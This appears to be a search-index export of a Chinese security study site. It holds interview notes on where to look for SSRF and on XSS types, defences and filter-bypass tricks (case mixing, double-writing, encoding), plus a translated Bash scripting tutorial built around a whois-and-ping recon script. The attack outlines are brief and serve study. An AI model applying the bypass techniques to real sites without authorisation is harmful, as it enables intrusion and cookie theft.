<p>4.\u56fe\u7247\u52a0\u8f7d\u4e0e\u4e0b\u8f7d\uff1a\u901a\u8fc7URL\u5730\u5740\u52a0\u8f7d\u6216\u4e0b\u8f7d\u56fe\u7247</p> <p>5.\u56fe\u7247\u3001\u6587\u7ae0\u6536\u85cf\u529f\u80fd</p> <p>6.\u672a\u516c\u5f00\u7684api\u5b9e\u73b0\u4ee5\u53ca\u5176\u4ed6\u8c03\u7528URL\u7684\u529f\u80fd</p> <p>7.\u4eceURL\u5173\u952e\u5b57\u4e2d\u5bfb\u627e\uff0cShare\u3001wap\u3001url\u3001link\u3001src\u3001source\u3001target\u3001u\u30013g\u3001display\u3001sourceURL\u3001imageURL\u3001domain</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#xss_4","title":"Xss\u539f\u7406/\u5206\u7c7b/\u9632\u5fa1/\u7ed5\u8fc7/\u6316\u6398","text":"<p>xss\u539f\u7406</p> <p>web\u9875\u9762\u7528\u6237\u8f93\u5165\u53ef\u63a7\uff0c\u63d2\u5165\u6076\u610fJs\u4ee3\u7801\u6216\u88ab\u5b58\u50a8\u8fdb\u6570\u636e\u5e93\u4e2d\uff0c\u6d4f\u89c8\u5668\u89e3\u6790\u6267\u884c\u83b7\u53d6\u7528\u6237cookie\u3002</p> <p>xss\u5206\u7c7b</p> <p>\u53cd\u5c04\u6027/dom\u578b/\u5b58\u50a8</p> <p>xss\u9632\u5fa1</p> <ol> <li>\u6b63\u5219\u8fc7\u6ee4\uff08\u6807\u7b7e/js\u4ee3\u7801/\u4e8b\u4ef6\uff09</li> <li>\u7528\u6237\u7684\u8f93\u5165\u8fdb\u884chtml\u7f16\u7801\u8f93\u51fa\uff08\u65e0\u6cd5\u8fdb\u884c\u95ed\u5408\uff09</li> <li>\u670d\u52a1\u7aef\u8bbe\u7f6e\u4f1a\u8bddCookie\u7684HTTP Only\u5c5e\u6027\uff08\u4e0d\u80fd\u83b7\u53d6cookie\uff09</li> <li>\u9650\u5236\u957f\u5ea6</li> </ol> <p>xss\u7ed5\u8fc7</p> <ol> <li>\u5927\u5c0f\u5199/\u53cc\u5199/\u9576\u5d4c</li> <li>url\u7f16\u7801/html\u5b9e\u4f53\u7f16\u7801/\u7f16\u7801\u5355\u4e2a\u5b57\u7b26</li> <li>\u7981\u7528\u54ea\u4e9b\u6807\u7b7e\uff0c\u66f4\u6362\u6807\u7b7e</li> <li>"},{"location":"Linux/Bash%20%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/","title":"Bash \u6267\u884c\u6d41\u7a0b","text":""},{"location":"Linux/Bash%20%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/#functions","title":"Functions","text":"<p>\u6211\u4eec\u7684\u811a\u672c\u8d8a\u5927\uff0c\u5b83\u4eec\u5c31\u8d8a\u6df7\u4e71\u3002\u5982\u679c\u6211\u4eec\u5728\u811a\u672c\u4e2d\u591a\u6b21\u4f7f\u7528\u76f8\u540c\u7684\u4f8b\u7a0b\uff0c\u811a\u672c\u7684\u5927\u5c0f\u4f1a\u76f8\u5e94\u589e\u52a0\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c<code>functions</code>\u53ef\u4ee5\u591a\u6b21\u63d0\u9ad8\u811a\u672c\u7684\u5927\u5c0f\u548c\u6e05\u6670\u5ea6\u7684\u89e3\u51b3\u65b9\u6848\u3002\u6211\u4eec\u5c06\u51e0\u4e2a\u547d\u4ee4\u7ec4\u5408\u5728\u4e00\u4e2a\u5927\u62ec\u53f7 (\u00a0<code>{</code>...\u00a0<code>}</code>) \u4e4b\u95f4\u7684\u5757\u4e2d\uff0c\u5e76\u4f7f\u7528\u6211\u4eec\u5b9a\u4e49\u7684\u51fd\u6570\u540d\u79f0\u8c03\u7528\u5b83\u4eec<code>functions</code>\u3002\u4e00\u65e6\u5b9a\u4e49\u4e86\u51fd\u6570\uff0c\u5c31\u53ef\u4ee5\u5728\u811a\u672c\u671f\u95f4\u518d\u6b21\u8c03\u7528\u548c\u4f7f\u7528\u5b83\u3002</p> <p><code>Functions</code>\u662f\u811a\u672c\u548c\u7a0b\u5e8f\u7684\u91cd\u8981\u7ec4\u6210\u90e8\u5206\uff0c\u56e0\u4e3a\u5b83\u4eec\u7528\u4e8e\u4e3a\u811a\u672c\u6216\u7a0b\u5e8f\u7684\u4e0d\u540c\u503c\u548c\u9636\u6bb5\u6267\u884c\u91cd\u590d\u547d\u4ee4\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u4e0d\u5fc5\u91cd\u590d\u6574\u4e2a\u4ee3\u7801\u6bb5\uff0c\u800c\u662f\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u5355\u72ec\u7684\u51fd\u6570\u6765\u6267\u884c\u7279\u5b9a\u7684\u547d\u4ee4\u3002\u6b64\u7c7b\u51fd\u6570\u7684\u5b9a\u4e49\u4f7f\u4ee3\u7801\u66f4\u6613\u4e8e\u9605\u8bfb\uff0c\u5e76\u6709\u52a9\u4e8e\u4f7f\u4ee3\u7801\u5c3d\u53ef\u80fd\u77ed\u3002\u91cd\u8981\u7684\u662f\u8981\u6ce8\u610f\uff0c\u51fd\u6570\u5fc5\u987b\u59cb\u7ec8<code>before</code>\u5728\u7b2c\u4e00\u6b21\u8c03\u7528\u65f6\u5728\u903b\u8f91\u4e0a\u5b9a\u4e49\uff0c\u56e0\u4e3a\u811a\u672c\u4e5f\u662f\u4ece\u4e0a\u5230\u4e0b\u5904\u7406\u7684\u3002\u56e0\u6b64\uff0c\u51fd\u6570\u7684\u5b9a\u4e49\u59cb\u7ec8<code>at the beginning</code>\u662f\u811a\u672c\u7684\u3002\u5b9a\u4e49\u51fd\u6570\u6709\u4e24\u79cd\u65b9\u6cd5\uff1a</p>"},{"location":"Linux/Bash%20%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/#1-","title":"\u65b9\u6cd5 1 - \u51fd\u6570","text":"<pre><code>function name {\n    &lt;commands&gt;\n}\n</code></pre>"},{"location":"Linux/Bash%20%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/#2-","title":"\u65b9\u6cd5 2 - \u51fd\u6570","text":"<pre><code>name() {\n    &lt;commands&gt;\n}\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u65b9\u6cd5\u6765\u5b9a\u4e49\u6700\u9002\u5408\u6211\u4eec\u7684\u51fd\u6570\u3002\u5728\u6211\u4eec\u7684<code>CIDR.sh</code>\u811a\u672c\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528\u4e86\u7b2c\u4e00\u79cd\u65b9\u6cd5\uff0c\u56e0\u4e3a\u4f7f\u7528\u5173\u952e\u5b57\u201c<code>function</code>\u201d\u66f4\u5bb9\u6613\u9605\u8bfb\u3002</p>"},{"location":"Linux/Bash%20%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/#cidrsh","title":"CIDR.sh","text":"<pre><code>&lt;SNIP&gt;\n# Identify Network range for the specified IP address(es)\nfunction network_range {\n    for ip in $ipaddr\n    do\n        netrange=$(whois $ip | grep \"NetRange\\|CIDR\" | tee -a CIDR.txt)\n        cidr=$(whois $ip | grep \"CIDR\" | awk '{print $2}')\n        cidr_ips=$(prips $cidr)\n        echo -e \"\\nNetRange for $ip:\"\n        echo -e \"$netrange\"\n    done\n}\n&lt;SNIP&gt;\n</code></pre> <p>\u51fd\u6570\u53ea\u80fd\u901a\u8fc7\u8c03\u7528\u51fd\u6570\u7684\u6307\u5b9a\u540d\u79f0\u6765\u8c03\u7528\uff0c\u6b63\u5982\u6211\u4eec\u5728 case \u8bed\u53e5\u4e2d\u770b\u5230\u7684\u90a3\u6837\u3002</p>"},{"location":"Linux/Bash%20%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/#-cidrsh","title":"\u51fd\u6570\u6267\u884c - CIDR.sh","text":"<pre><code>&lt;SNIP&gt;\ncase $opt in\n    \"1\") network_range ;;\n    \"2\") ping_host ;;\n    \"3\") network_range &amp;&amp; ping_host ;;\n    \"*\") exit 0 ;;\nesac\n</code></pre>"},{"location":"Linux/Bash%20%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/#_1","title":"\u53c2\u6570\u4f20\u9012","text":"<p>\u6b64\u7c7b\u51fd\u6570\u7684\u8bbe\u8ba1\u5e94\u4f7f\u5b83\u4eec\u53ef\u4ee5\u4e0e\u503c\u7684\u56fa\u5b9a\u7ed3\u6784\u4e00\u8d77\u4f7f\u7528\uff0c\u6216\u8005\u81f3\u5c11\u53ea\u80fd\u4e0e\u56fa\u5b9a\u683c\u5f0f\u4e00\u8d77\u4f7f\u7528\u3002\u5c31\u50cf\u6211\u4eec\u5df2\u7ecf\u5728<code>CIDR.sh</code>\u811a\u672c\u4e2d\u770b\u5230\u7684\u90a3\u6837\uff0c\u6211\u4eec\u4e3a\u51fd\u6570\u201c\u00a0<code>network_range</code>\u201d\u4f7f\u7528\u4e86 IP \u5730\u5740\u7684\u683c\u5f0f\u3002\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5728\u6ca1\u6709\u53c2\u6570\u7684\u60c5\u51b5\u4e0b\u8c03\u7528\u8be5\u51fd\u6570\u3002\u539f\u5219\u4e0a\uff0c\u4f20\u9012\u7684\u53c2\u6570\u4e0e\u4f20\u9012\u7ed9 shell \u811a\u672c\u7684\u53c2\u6570\u76f8\u540c\u3002\u8fd9\u4e9b\u662f<code>$1</code>-\u00a0<code>$9</code>(\u00a0<code>${n}</code>)\uff0c\u6216\u8005<code>$variable</code>\u6b63\u5982\u6211\u4eec\u5df2\u7ecf\u770b\u5230\u7684\u90a3\u6837\u3002\u6bcf\u4e2a\u51fd\u6570\u90fd\u6709\u81ea\u5df1\u7684\u4e00\u7ec4\u53c2\u6570\u3002\u56e0\u6b64\u5b83\u4eec\u4e0d\u4f1a\u4e0e\u5176\u4ed6\u51fd\u6570\u6216 shell \u811a\u672c\u7684\u53c2\u6570\u53d1\u751f\u51b2\u7a81\u3002</p> <p>bash \u811a\u672c\u548c\u5176\u4ed6\u7f16\u7a0b\u8bed\u8a00\u4e4b\u95f4\u7684\u4e00\u4e2a\u91cd\u8981\u533a\u522b\u662f\uff0c\u9664\u975e\u201c\u00a0local<code>globally</code>\u00a0\u201d\u53e6\u6709\u58f0\u660e\uff0c\u5426\u5219\u59cb\u7ec8\u5904\u7406\u6240\u6709\u5b9a\u4e49\u7684\u53d8\u91cf\u3002\u8fd9\u610f\u5473\u7740\u6211\u4eec\u7b2c\u4e00\u6b21\u5728\u51fd\u6570\u4e2d\u5b9a\u4e49\u53d8\u91cf\u65f6\uff0c\u6211\u4eec\u5c06\u5728\u6211\u4eec\u7684\u4e3b\u811a\u672c\uff08\u51fd\u6570\u5916\u90e8\uff09\u4e2d\u8c03\u7528\u5b83\u3002\u5c06\u53c2\u6570\u4f20\u9012\u7ed9\u51fd\u6570\u7684\u65b9\u5f0f\u4e0e\u6211\u4eec\u5c06\u53c2\u6570\u4f20\u9012\u7ed9\u811a\u672c\u7684\u65b9\u5f0f\u76f8\u540c\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p>"},{"location":"Linux/Bash%20%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/#printparssh","title":"PrintPars.sh","text":"<pre><code>#!/bin/bash\n\nfunction print_pars {\n    echo $1 $2 $3\n}\n\none=\"First parameter\"\ntwo=\"Second parameter\"\nthree=\"Third parameter\"\n\nprint_pars \"$one\" \"$two\" \"$three\"\n</code></pre>"},{"location":"Linux/Bash%20%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/#_2","title":"\u8fd4\u56de\u503c","text":"<p>\u5f53\u6211\u4eec\u542f\u52a8\u4e00\u4e2a\u65b0\u8fdb\u7a0b\u65f6\uff0c\u6bcf\u4e2a<code>child process</code>\uff08\u4f8b\u5982\uff0c\u5df2\u6267\u884c\u811a\u672c\u4e2d\u7684 a\uff09\u5728\u5176\u7ec8\u6b62\u65f6<code>function</code>\u5c06 a \u8fd4\u56de<code>return code</code>\u5230<code>parent process</code>\uff08<code>bash shell</code>\u901a\u8fc7\u5b83\u6211\u4eec\u6267\u884c\u811a\u672c\uff09\uff0c\u901a\u77e5\u5b83\u6267\u884c\u7684\u72b6\u6001\u3002\u6b64\u4fe1\u606f\u7528\u4e8e\u786e\u5b9a\u8fdb\u7a0b\u662f\u5426\u6210\u529f\u8fd0\u884c\u6216\u662f\u5426\u53d1\u751f\u7279\u5b9a\u9519\u8bef\u3002\u57fa\u4e8e\u6b64\u4fe1\u606f\uff0c<code>parent process</code>\u53ef\u4ee5\u51b3\u5b9a\u8fdb\u4e00\u6b65\u7684\u7a0b\u5e8f\u6d41\u7a0b\u3002 Return Code | \u63cf\u8ff0 | --- | --- | <code>1</code> | \u4e00\u822c\u9519\u8bef <code>2</code> | \u6ee5\u7528 shell \u5185\u7f6e\u51fd\u6570 <code>126</code> | \u8c03\u7528\u7684\u547d\u4ee4\u65e0\u6cd5\u6267\u884c <code>127</code> | \u627e\u4e0d\u5230\u76f8\u5173\u547d\u4ee4 <code>128</code> | \u9000\u51fa\u53c2\u6570\u65e0\u6548 <code>128+n</code> | \u81f4\u547d\u9519\u8bef\u4fe1\u53f7\u201c\u00a0<code>n</code>\u201d <code>130</code> | \u7531 Control-C \u7ec8\u6b62\u7684\u811a\u672c <code>255\\*</code> | \u9000\u51fa\u72b6\u6001\u8d85\u51fa\u8303\u56f4</p> <p>\u8981\u53d6\u56de\u51fd\u6570\u7684\u503c\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u51e0\u79cd\u65b9\u6cd5\uff0c\u4f8b\u5982<code>return</code>\u3001<code>echo</code>\u6216 a\u00a0<code>variable</code>\u3002\u5728\u4e0b\u4e00\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u5c06\u770b\u5230\u5982\u4f55\u4f7f\u7528\u201c\u00a0<code>$?</code>\u201d\u6765\u8bfb\u53d6\u201c\u201d\u00a0<code>return code</code>\uff0c\u5982\u4f55\u5c06\u53c2\u6570\u4f20\u9012\u7ed9\u51fd\u6570\u4ee5\u53ca\u5982\u4f55\u5c06\u7ed3\u679c\u5206\u914d\u7ed9\u53d8\u91cf\u3002</p>"},{"location":"Linux/Bash%20%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/#returnsh","title":"Return.sh","text":"<pre><code>#!/bin/bash\n\nfunction given_args {\n\n        if [ $# -lt 1 ]\n        then\n                echo -e \"Number of arguments: $#\"\n                return 1\n        else\n                echo -e \"Number of arguments: $#\"\n                return 0\n        fi\n}\n\n# No arguments given\ngiven_args\necho -e \"Function status code: $?\\n\"\n\n# One argument given\ngiven_args \"argument\"\necho -e \"Function status code: $?\\n\"\n\n# Pass the results of the funtion into a variable\ncontent=$(given_args \"argument\")\n\necho -e \"Content of the variable: \\n\\t$content\"\n</code></pre>"},{"location":"Linux/Bash%20%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/#returnsh-","title":"Return.sh - \u6267\u884c","text":"<pre><code>$ ./Return.sh\n\nNumber of arguments: 0\nFunction status code: 1\n\nNumber of arguments: 1\nFunction status code: 0\n\nContent of the variable:\n    Number of arguments: 1\n</code></pre>"},{"location":"Linux/Bash%20%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/#_3","title":"\u8c03\u8bd5","text":"<p>Bash \u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5f88\u597d\u7684\u673a\u4f1a\u6765\u67e5\u627e\u3001\u8ddf\u8e2a\u548c\u4fee\u590d\u4ee3\u7801\u4e2d\u7684\u9519\u8bef\u3002\u8be5\u672f\u8bed<code>debugging</code>\u53ef\u4ee5\u6709\u8bb8\u591a\u4e0d\u540c\u7684\u542b\u4e49\u3002\u5c3d\u7ba1\u5982\u6b64\uff0cBash \u8c03\u8bd5\u662f\u4ece\u6211\u4eec\u7684\u4ee3\u7801\u4e2d\u5220\u9664\u9519\u8bef\uff08bug\uff09\u7684\u8fc7\u7a0b\u3002\u8c03\u8bd5\u53ef\u4ee5\u901a\u8fc7\u8bb8\u591a\u4e0d\u540c\u7684\u65b9\u5f0f\u8fdb\u884c\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6211\u4eec\u7684\u4ee3\u7801\u8fdb\u884c\u8c03\u8bd5\u4ee5\u68c0\u67e5\u62fc\u5199\u9519\u8bef\uff0c\u6216\u8005\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u7528\u4e8e\u4ee3\u7801\u5206\u6790\u4ee5\u8ddf\u8e2a\u5b83\u4eec\u5e76\u786e\u5b9a\u53d1\u751f\u7279\u5b9a\u9519\u8bef\u7684\u539f\u56e0\u3002</p> <p>\u6b64\u8fc7\u7a0b\u8fd8\u7528\u4e8e\u67e5\u627e\u7a0b\u5e8f\u4e2d\u7684\u6f0f\u6d1e\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u4f7f\u7528\u4e0d\u540c\u7684\u8f93\u5165\u7c7b\u578b\u5bfc\u81f4\u9519\u8bef\uff0c\u5e76\u901a\u8fc7\u6c47\u7f16\u7a0b\u5e8f\u8ddf\u8e2a\u5b83\u4eec\u5728 CPU \u4e2d\u7684\u5904\u7406\uff0c\u8fd9\u53ef\u80fd\u63d0\u4f9b\u4e00\u79cd\u65b9\u6cd5\u6765\u64cd\u7eb5\u8fd9\u4e9b\u9519\u8bef\u7684\u5904\u7406\uff0c\u4ee5\u63d2\u5165\u6211\u4eec\u81ea\u5df1\u7684\u4ee3\u7801\u5e76\u5f3a\u5236\u7cfb\u7edf\u6267\u884c\u5b83\u3002\u8be5\u4e3b\u9898\u5c06\u5728\u5176\u4ed6\u6a21\u5757\u4e2d\u8be6\u7ec6\u4ecb\u7ecd\u548c\u8ba8\u8bba\u3002Bash \u5141\u8bb8\u6211\u4eec\u4f7f\u7528 \"\u00a0<code>-x</code>\" (\u00a0<code>xtrace</code>) \u548c \"\u00a0<code>-v</code>\" \u9009\u9879\u6765\u8c03\u8bd5\u6211\u4eec\u7684\u4ee3\u7801\u3002\u73b0\u5728\u8ba9\u6211\u4eec\u770b\u4e00\u4e2a<code>CIDR.sh</code>\u811a\u672c\u793a\u4f8b\u3002</p>"},{"location":"Linux/Bash%20%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/#cidrsh-","title":"CIDR.sh - \u8c03\u8bd5","text":"<pre><code>$ bash -x CIDR.sh\n\n+ '[' 0 -eq 0 ']'\n+ echo -e 'You need to specify the target domain.\\n'\nYou need to specify the target domain.\n\n+ echo -e Usage:\nUsage:\n+ echo -e '\\tCIDR.sh &lt;domain&gt;'\n    CIDR.sh &lt;domain&gt;\n+ exit 1\n</code></pre> <p>\u5728\u8fd9\u91cc\uff0cBash \u51c6\u786e\u5730\u5411\u6211\u4eec\u5c55\u793a\u4e86\u4f7f\u7528\u54ea\u4e9b\u503c\u6267\u884c\u4e86\u54ea\u4e2a\u51fd\u6570\u6216\u547d\u4ee4\u3002\u8fd9\u7531\u884c\u9996\u7684\u52a0\u53f7 (\u00a0<code>+</code>) \u8868\u793a\u3002\u5982\u679c\u6211\u4eec\u60f3\u67e5\u770b\u7279\u5b9a\u51fd\u6570\u7684\u6240\u6709\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6e \"\u00a0<code>-v</code>\" \u9009\u9879\u4ee5\u66f4\u8be6\u7ec6\u5730\u663e\u793a\u8f93\u51fa\u3002</p>"},{"location":"Linux/Bash%20%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/#cidrsh-_1","title":"CIDR.sh - \u8be6\u7ec6\u8c03\u8bd5","text":"<pre><code>darkinga@htb[/htb]$ bash -x -v CIDR.sh\n\n#!/bin/bash\n\n# Check for given argument\nif [ $# -eq 0 ]\nthen\n    echo -e \"You need to specify the target domain.\\n\"\n    echo -e \"Usage:\"\n    echo -e \"\\t$0 &lt;domain&gt;\"\n    exit 1\nelse\n    domain=$1\nfi\n+ '[' 0 -eq 0 ']'\n+ echo -e 'You need to specify the target domain.\\n'\nYou need to specify the target domain.\n\n+ echo -e Usage:\nUsage:\n+ echo -e '\\tCIDR.sh &lt;domain&gt;'\n    CIDR.sh &lt;domain&gt;\n+ exit 1\n</code></pre> <p>\u4e0e\u6b63\u5e38\u8c03\u8bd5\u76f8\u6bd4\uff0c\u6211\u4eec\u770b\u5230\u5230\u76ee\u524d\u4e3a\u6b62\u5df2\u5904\u7406\u7684\u6574\u4e2a\u4ee3\u7801\u90e8\u5206\uff0c\u7136\u540e\u662f\u5df2\u91c7\u53d6\u7684\u5404\u4e2a\u6b65\u9aa4\u3002</p> <p>\u5728\u672c\u6a21\u5757\u4e2d\uff0c\u6211\u4eec\u5c06\u4ecb\u7ecd\uff1a</p> <ul> <li>Bash \u811a\u672c\u7b80\u4ecb</li> <li>\u6761\u4ef6\u6267\u884c</li> <li>\u4f7f\u7528\u53c2\u6570\u3001\u53d8\u91cf\u548c\u6570\u7ec4</li> <li>\u6bd4\u8f83\u8fd0\u7b97\u7b26\u3001\u7b97\u672f\u548c\u8f93\u5165/\u8f93\u51fa\u63a7\u5236</li> <li>\u5faa\u73af\u3001\u5206\u652f\u548c\u51fd\u6570</li> <li>\u8c03\u8bd5 Bash \u811a\u672c\u7684\u6280\u672f</li> </ul> <p>\u672c\u6a21\u5757\u5206\u4e3a\u591a\u4e2a\u90e8\u5206\uff0c\u5e76\u9644\u6709\u52a8\u624b\u7ec3\u4e60\uff0c\u4ee5\u7ec3\u4e60\u6211\u4eec\u6db5\u76d6\u7684\u6bcf\u4e00\u79cd\u6218\u672f\u548c\u6280\u672f\u3002\u8be5\u6a21\u5757\u4ee5\u5b9e\u7528\u7684\u52a8\u624b\u6280\u80fd\u8bc4\u4f30\u7ed3\u675f\uff0c\u4ee5\u8861\u91cf\u60a8\u5bf9\u5404\u4e2a\u4e3b\u9898\u9886\u57df\u7684\u7406\u89e3\u3002</p> <p>\u5728\u60a8\u5b8c\u6210\u8be5\u6a21\u5757\u65f6\uff0c\u60a8\u5c06\u770b\u5230\u9488\u5bf9\u6240\u4ecb\u7ecd\u7684\u5404\u79cd\u4e3b\u9898\u7684\u793a\u4f8b\u547d\u4ee4\u548c\u547d\u4ee4\u8f93\u51fa\u3002\u503c\u5f97\u5c3d\u53ef\u80fd\u591a\u5730\u590d\u5236\u8fd9\u4e9b\u793a\u4f8b\uff0c\u4ee5\u8fdb\u4e00\u6b65\u5f3a\u5316\u6bcf\u4e2a\u90e8\u5206\u4e2d\u4ecb\u7ecd\u7684\u6982\u5ff5\u3002\u60a8\u53ef\u4ee5\u5728\u4ea4\u4e92\u5f0f\u90e8\u5206\u63d0\u4f9b\u7684 Pwnbox \u6216\u60a8\u81ea\u5df1\u7684\u865a\u62df\u673a\u4e2d\u6267\u884c\u6b64\u64cd\u4f5c\u3002</p> <p>\u60a8\u53ef\u4ee5\u968f\u65f6\u542f\u52a8\u548c\u505c\u6b62\u6a21\u5757\u5e76\u4ece\u4e0a\u6b21\u4e2d\u65ad\u7684\u5730\u65b9\u7ee7\u7eed\u3002\u6ca1\u6709\u65f6\u95f4\u9650\u5236\u6216\u201c\u8bc4\u5206\u201d\uff0c\u4f46\u60a8\u5fc5\u987b\u5b8c\u6210\u6240\u6709\u7ec3\u4e60\u548c\u6280\u80fd\u8bc4\u4f30\u624d\u80fd\u83b7\u5f97\u6700\u5927\u6570\u91cf\u7684\u7acb\u65b9\u4f53\uff0c\u5e76\u5728\u60a8\u9009\u62e9\u7684\u4efb\u4f55\u8def\u5f84\u4e2d\u5c06\u6b64\u6a21\u5757\u6807\u8bb0\u4e3a\u5b8c\u6210\u3002</p> <p>\u8be5\u6a21\u5757\u88ab\u5f52\u7c7b\u4e3a\u201c\u7b80\u5355\u201d\uff0c\u4f46\u5047\u8bbe\u60a8\u5177\u6709 Linux \u547d\u4ee4\u884c\u7684\u5de5\u4f5c\u77e5\u8bc6\u5e76\u4e86\u89e3\u4fe1\u606f\u5b89\u5168\u57fa\u7840\u77e5\u8bc6\u3002</p> <p>\u7262\u7262\u638c\u63e1\u4ee5\u4e0b\u6a21\u5757\u53ef\u88ab\u89c6\u4e3a\u6210\u529f\u5b8c\u6210\u672c\u6a21\u5757\u7684\u5148\u51b3\u6761\u4ef6\uff1a</p> <ul> <li>Linux \u57fa\u7840</li> <li>\u7f51\u7edc\u8bf7\u6c42</li> </ul>"},{"location":"Linux/Bash%20%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/#bash","title":"bash","text":""},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/","title":"Bash \u811a\u672c\u63a7\u5236","text":""},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#_1","title":"\u8f93\u5165\u548c\u8f93\u51fa","text":""},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#_2","title":"\u8f93\u5165\u63a7\u5236","text":"<p>\u6211\u4eec\u53ef\u80fd\u4f1a\u4ece\u6211\u4eec\u53d1\u9001\u7684\u8bf7\u6c42\u548c\u6267\u884c\u7684\u547d\u4ee4\u4e2d\u5f97\u5230\u7ed3\u679c\uff0c\u6211\u4eec\u5fc5\u987b\u624b\u52a8\u51b3\u5b9a\u5982\u4f55\u7ee7\u7eed\u3002\u53e6\u4e00\u4e2a\u4f8b\u5b50\u662f\u6211\u4eec\u5728\u4e3a\u4e0d\u540c\u573a\u666f\u8bbe\u8ba1\u7684\u811a\u672c\u4e2d\u5b9a\u4e49\u4e86\u51e0\u4e2a\u51fd\u6570\u3002\u6211\u4eec\u5fc5\u987b\u5728\u624b\u52a8\u68c0\u67e5\u540e\u5e76\u6839\u636e\u7ed3\u679c\u6765\u51b3\u5b9a\u5e94\u8be5\u6267\u884c\u54ea\u4e9b\u3002\u4e5f\u5f88\u6709\u53ef\u80fd\u4e0d\u5141\u8bb8\u6267\u884c\u7279\u5b9a\u7684\u626b\u63cf\u6216\u6d3b\u52a8\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u719f\u6089\u5982\u4f55\u83b7\u5f97\u4e00\u4e2a\u8fd0\u884c\u811a\u672c\u6765\u7b49\u5f85\u6211\u4eec\u7684\u6307\u4ee4\u3002\u5982\u679c\u6211\u4eec<code>CIDR.sh</code>\u518d\u6b21\u67e5\u770b\u6211\u4eec\u7684\u811a\u672c\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u6211\u4eec\u6dfb\u52a0\u4e86\u8fd9\u6837\u4e00\u4e2a\u8c03\u7528\u6765\u51b3\u5b9a\u8fdb\u4e00\u6b65\u7684\u6b65\u9aa4\u3002</p>"},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#cidrsh","title":"CIDR.sh","text":"<pre><code># Available options\n&lt;SNIP&gt;\necho -e \"Additional options available:\"\necho -e \"\\t1) Identify the corresponding network range of target domain.\"\necho -e \"\\t2) Ping discovered hosts.\"\necho -e \"\\t3) All checks.\"\necho -e \"\\t*) Exit.\\n\"\n\nread -p \"Select your option: \" opt\n\ncase $opt in\n    \"1\") network_range ;;\n    \"2\") ping_host ;;\n    \"3\") network_range &amp;&amp; ping_host ;;\n    \"*\") exit 0 ;;\nesac\n</code></pre> <p>\u7b2c\u4e00<code>echo</code>\u884c\u7528\u4f5c\u6211\u4eec\u53ef\u7528\u9009\u9879\u7684\u663e\u793a\u83dc\u5355\u3002\u4f7f\u7528\u8be5<code>read</code>\u547d\u4ee4\uff0c\u5c06<code>Select your option:</code>\u663e\u793a\u5e26\u6709\u201c\u201d\u7684\u884c\uff0c\u5e76\u4e14\u9644\u52a0\u9009\u9879<code>-p</code>\u786e\u4fdd\u6211\u4eec\u7684\u8f93\u5165\u4fdd\u6301\u5728\u540c\u4e00\u884c\u3002\u6211\u4eec\u7684\u8f93\u5165\u5b58\u50a8\u5728\u53d8\u91cf<code>opt</code>\u4e2d\uff0c\u7136\u540e\u6211\u4eec\u7528\u5b83\u6765\u6267\u884c\u5e26\u6709<code>case</code>\u8bed\u53e5\u7684\u76f8\u5e94\u51fd\u6570\uff0c\u6211\u4eec\u7a0d\u540e\u4f1a\u770b\u5230\u3002\u6839\u636e\u6211\u4eec\u8f93\u5165\u7684\u6570\u5b57\uff0c<code>case</code>\u8bed\u53e5\u786e\u5b9a\u6267\u884c\u54ea\u4e9b\u51fd\u6570\u3002</p>"},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#_3","title":"\u8f93\u51fa\u63a7\u5236","text":"<p>\u6211\u4eec\u5df2\u7ecf\u4e86\u89e3\u4e86<code>Linux 